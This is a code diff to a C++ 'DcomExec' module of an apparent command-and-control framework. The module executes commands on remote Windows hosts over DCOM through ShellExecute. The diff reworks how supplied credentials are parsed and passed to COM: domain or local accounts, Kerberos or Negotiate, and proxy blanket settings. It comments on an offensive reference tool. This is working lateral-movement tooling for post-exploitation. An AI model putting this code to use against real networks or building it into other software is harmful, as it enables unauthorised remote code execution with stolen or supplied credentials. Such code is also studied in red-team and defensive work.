@@ -6,6 +6,7 @@
 
 #ifdef _WIN32
 #include <windows.h>
+#include <cwchar>
 #include <atlbase.h>
 #include <comdef.h>
 #pragma comment(lib, "ole32.lib")
@@ -278,6 +279,8 @@ int DcomExec::process(C2Message& c2Message, C2Message& c2RetMessage)
 #define ERROR_INVOKE_APPLICATION_FAILED 9
 #define ERROR_GETIDS_SHELLEXECUTE_FAILED 10
 #define ERROR_INVOKE_SHELLEXECUTE_FAILED 11
+#define ERROR_AUTHIDENTITY_ALLOC_FAILED 12
+#define ERROR_SET_PROXY_BLANKET_FAILED 13
 
 
 int DcomExec::errorCodeToMsg(const C2Message& c2RetMessage, std::string& errorMsg)
@@ -399,64 +402,117 @@ namespace
 // TODO https://github.com/xforcered/ForsHops/blob/main/ForsHops.cpp ?
 int DcomExec::executeRemote(const Parameters& params, std::string& result) const
 {
-    DWORD authnSvc = RPC_C_AUTHN_NONE;          // RPC_C_AUTHN_GSS_KERBEROS or RPC_C_AUTHN_WINNT
-    bool useToken = false;                      // use current process token / Kerberos ticket
-    bool useNTLM = false;                       // use explicit username/password (NTLM or Kerberos based on authnSvc)
-    std::wstring spn;                           // SPN to use (may be empty)
+    DWORD authnSvc = RPC_C_AUTHN_NONE;
+    const DWORD authzSvc = RPC_C_AUTHZ_NONE;
+    const DWORD authnLevel = RPC_C_AUTHN_LEVEL_PKT_PRIVACY;
+    const DWORD impLevel = RPC_C_IMP_LEVEL_IMPERSONATE;
+    DWORD capabilities = EOAC_NONE;
+
+    std::wstring spn = std::wstring(params.spn.begin(), params.spn.end());
+    std::wstring hostnameWide = toWide(params.hostname);
     std::wstring domainW;
     std::wstring userW;
     std::wstring passW;
 
     bool usernameProvided = !params.username.empty();
     bool passwordProvided = !params.password.empty();
-    bool noPassword = params.noPassword; // -n
-    
-    spn = std::wstring(params.spn.begin(), params.spn.end()); // copy SPN to wide string for CoSetProxyBlanket later
 
-    // Case 1: explicit username + password -> use explicit creds (NTLM)
-    if (usernameProvided && passwordProvided)
+    bool useExplicitCreds = usernameProvided && passwordProvided;
+
+    COAUTHIDENTITY* authIdentity = nullptr;
+    COAUTHINFO authInfo = {};
+    bool authInfoConfigured = false;
+
+    if (useExplicitCreds)
     {
-        useNTLM = true;
-        useToken = false;
-        authnSvc = RPC_C_AUTHN_WINNT; // explicit credential path (NTLM) — SSPI may pick Kerberos if appropriate, but WinNT forces NTLM
-        // split username into domain\user if user passed with backslash?
-        domainW = L"";
         userW = std::wstring(params.username.begin(), params.username.end());
+        passW = std::wstring(params.password.begin(), params.password.end());
 
-        // If user provided as "DOMAIN\\user", split
-        size_t pos = userW.find(L'\\');
-        if (pos != std::wstring::npos) 
+        // Support both DOMAIN\\User and user@domain.local notations
+        size_t slashPos = userW.find(L'\\');
+        size_t atPos = userW.find(L'@');
+        if (slashPos != std::wstring::npos)
         {
-            domainW = userW.substr(0, pos);
-            userW = userW.substr(pos + 1);
-        } 
-        else 
+            domainW = userW.substr(0, slashPos);
+            userW = userW.substr(slashPos + 1);
+        }
+        else if (atPos != std::wstring::npos)
         {
-            // fallback domain provided by params? You might have a separate domain parameter; assume local machine if not set.
-            domainW = L"";
+            std::wstring domainPart = userW.substr(atPos + 1);
+            userW = userW.substr(0, atPos);
+            domainW = domainPart;
+        }
+        else
+        {
+            domainW.clear();
         }
 
-        passW = std::wstring(params.password.begin(), params.password.end());
-    }
+        // Detect local account usage (DOMAIN == '.' or empty or same as hostname)
+        bool isLocalAccount = false;
+        if (domainW.empty() || domainW == L".")
+        {
+            isLocalAccount = true;
+        }
+        else if (!hostnameWide.empty() && _wcsicmp(domainW.c_str(), hostnameWide.c_str()) == 0)
+        {
+            isLocalAccount = true;
+        }
 
-    // Case 2: username provided but no password (and -n set) -> treat as "use token instead of sending password"
-    if (usernameProvided && !passwordProvided)
+        if (isLocalAccount)
+        {
+            // Use machine name when authenticating with a local account
+            if (!hostnameWide.empty())
+            {
+                domainW = hostnameWide;
+            }
+            authnSvc = RPC_C_AUTHN_WINNT;
+            capabilities = EOAC_SECURE_REFS;
+        }
+        else
+        {
+            // Domain credentials – prefer Kerberos when an SPN is supplied, fallback to Negotiate otherwise
+            authnSvc = spn.empty() ? RPC_C_AUTHN_GSS_NEGOTIATE : RPC_C_AUTHN_GSS_KERBEROS;
+            capabilities = spn.empty() ? EOAC_SECURE_REFS : (EOAC_MUTUAL_AUTH | EOAC_SECURE_REFS);
+        }
+
+        authIdentity = MakeAuthIdentityW(userW, domainW, passW);
+        if (!authIdentity)
+        {
+            result = "Failed to allocate authentication identity.";
+            return ERROR_AUTHIDENTITY_ALLOC_FAILED;
+        }
+
+        authInfo.dwAuthnSvc = authnSvc;
+        authInfo.dwAuthzSvc = authzSvc;
+        authInfo.pwszServerPrincName = spn.empty() ? nullptr : const_cast<LPWSTR>(spn.c_str());
+        authInfo.dwAuthnLevel = authnLevel;
+        authInfo.dwImpersonationLevel = impLevel;
+        authInfo.pAuthIdentityData = authIdentity;
+        authInfo.dwCapabilities = capabilities;
+        authInfoConfigured = true;
+    }
+    else
     {
-        // user asked not to send a password. We'll rely on current credentials (Kerberos) and optionally supply the username to server
-        // Implementation choice: we do not send pAuthIdentity, we let current token/SSPI handle auth. Still copy SPN if given.
-        useToken = true;
-        useNTLM = false;
-        authnSvc = RPC_C_AUTHN_GSS_KERBEROS; // prefer Kerberos
-
+        // No explicit credentials provided – rely on the caller's token
+        if (!spn.empty())
+        {
+            authnSvc = RPC_C_AUTHN_GSS_KERBEROS;
+            capabilities = EOAC_MUTUAL_AUTH | EOAC_SECURE_REFS;
+            authInfo.dwAuthnSvc = authnSvc;
+            authInfo.dwAuthzSvc = authzSvc;
+            authInfo.pwszServerPrincName = const_cast<LPWSTR>(spn.c_str());
+            authInfo.dwAuthnLevel = authnLevel;
+            authInfo.dwImpersonationLevel = impLevel;
+            authInfo.pAuthIdentityData = nullptr;
+            authInfo.dwCapabilities = capabilities;
+            authInfoConfigured = true;
+        }
+        else
+        {
+            authnSvc = RPC_C_AUTHN_GSS_NEGOTIATE;
+            capabilities = EOAC_SECURE_REFS;
+        }
     }
-
-    // Case 3: no cred provided
-    if (noPassword)
-    {
-        useToken = false;
-        useNTLM = false;
-    }
-
 
     HRESULT hr;
     bool needUninit = false;
@@ -501,9 +557,12 @@ int DcomExec::executeRemote(const Parameters& params, std::string& result) const
     }
 
     // Server info
-    std::wstring hostnameWide = toWide(params.hostname);
     COSERVERINFO serverInfo = {};
     serverInfo.pwszName = hostnameWide.empty() ? nullptr : const_cast<LPWSTR>(hostnameWide.c_str());
+    if (authInfoConfigured)
+    {
+        serverInfo.pAuthInfo = &authInfo;
+    }
 
     MULTI_QI mqi = {};
     mqi.pIID = &IID_IDispatch;
@@ -516,6 +575,7 @@ int DcomExec::executeRemote(const Parameters& params, std::string& result) const
     if (FAILED(hr) || FAILED(mqi.hr))
     {
         result = formatHResult(FAILED(hr) ? hr : mqi.hr);
+        if (authIdentity) FreeAuthIdentity(authIdentity);
         if (needUninit) CoUninitialize();
         return ERROR_COCREATEINSTANCE_FAILED;
     }
@@ -523,71 +583,35 @@ int DcomExec::executeRemote(const Parameters& params, std::string& result) const
     CComPtr<IDispatch> dispatch;
     dispatch.Attach(static_cast<IDispatch*>(mqi.pItf));
 
-    if(useNTLM)
+    LPWSTR proxySpn = nullptr;
+    if (authInfoConfigured && authInfo.pwszServerPrincName)
     {
-        // Prepare COAUTHIDENTITY and COAUTHINFO (Unicode preferred)
-        COAUTHIDENTITY* pAuthId = MakeAuthIdentityW(userW, domainW, passW);
-        COAUTHINFO authInfo = {};
-        authInfo.dwAuthnSvc = authnSvc; // or RPC_C_AUTHN_GSS_KERBEROS if needed
-        authInfo.dwAuthzSvc = RPC_C_AUTHZ_NONE;
-        authInfo.dwAuthnLevel = RPC_C_AUTHN_LEVEL_PKT_PRIVACY;
-        authInfo.dwImpersonationLevel = RPC_C_IMP_LEVEL_IMPERSONATE;
-        authInfo.pAuthIdentityData = pAuthId;
-        authInfo.dwCapabilities = EOAC_SECURE_REFS;
-
-
-        // Set security on the proxy (so subsequent calls use desired level)
-        hr = CoSetProxyBlanket(
-            dispatch,                            // proxy
-            RPC_C_AUTHN_WINNT,               // authn svc (NTLM)
-            RPC_C_AUTHZ_NONE,                // authz svc
-            nullptr,                         // server principal name (use default/search)
-            RPC_C_AUTHN_LEVEL_PKT_PRIVACY,   // authn level
-            RPC_C_IMP_LEVEL_IMPERSONATE,     // impersonation level
-            pAuthId,                         // auth identity (or nullptr to use current token)
-            EOAC_NONE                        // capabilities
-        );
-
-        if (FAILED(hr)) 
-        {
-            if (needUninit) CoUninitialize();
-            FreeAuthIdentity(pAuthId);
-            result = formatHResult(hr);
-            return -1000;
-        }
-
-        FreeAuthIdentity(pAuthId);
+        proxySpn = authInfo.pwszServerPrincName;
     }
-    else if(useToken)
+
+    hr = CoSetProxyBlanket(
+        dispatch,
+        authnSvc,
+        authzSvc,
+        proxySpn,
+        authnLevel,
+        impLevel,
+        authIdentity,
+        capabilities
+    );
+
+    if (FAILED(hr))
     {
-        // Choose authn service: explicit Kerberos or Negotiate (let SSPI choose)
-        const DWORD authnSvc = authnSvc; // explicit Kerberos
-        // const DWORD authnSvc = RPC_C_AUTHN_DEFAULT; // or Negotiate
+        result = formatHResult(hr);
+        if (authIdentity) FreeAuthIdentity(authIdentity);
+        if (needUninit) CoUninitialize();
+        return ERROR_SET_PROXY_BLANKET_FAILED;
+    }
 
-        const DWORD authzSvc = RPC_C_AUTHZ_NONE;
-        // Server principal name (SPN) - recommended to help SSPI pick the correct ticket.
-        // Example SPNs: L"HOST/host.fqdn", L"HOST/shortname", L"HTTP/service.host", etc.
-        LPCWSTR pszServerPrincName = spn.empty() ? nullptr : spn.c_str();
-
-        // Authentication level and impersonation
-        const DWORD authnLevel = RPC_C_AUTHN_LEVEL_PKT_PRIVACY; // strong
-        bool needDelegation = 0;
-        const DWORD impLevel = needDelegation ? RPC_C_IMP_LEVEL_DELEGATE : RPC_C_IMP_LEVEL_IMPERSONATE;
-
-        // pAuthInfo == nullptr -> use current process/thread credentials (Kerberos TGT)
-        // pAuthIdentity == nullptr since we want the current token / SSPI to supply creds
-        HRESULT hr = CoSetProxyBlanket(
-            dispatch,                   // proxy
-            authnSvc,               // RPC_C_AUTHN_GSS_KERBEROS (Kerberos)
-            authzSvc,               // RPC_C_AUTHZ_NONE
-            const_cast<wchar_t*>(pszServerPrincName),     // server principal name (SPN) or nullptr
-            authnLevel,             // authentication level
-            impLevel,               // impersonation level (DELEGATE if needed)
-            nullptr,                // pAuthInfo (NULL -> use current credentials)
-            EOAC_MUTUAL_AUTH | EOAC_SECURE_REFS // capabilities; add EOAC_MUTUAL_AUTH to require mutual auth
-        );
-
-        return hr;
+    if (authIdentity)
+    {
+        FreeAuthIdentity(authIdentity);
+        authIdentity = nullptr;
     }
 
     // Get "Item"
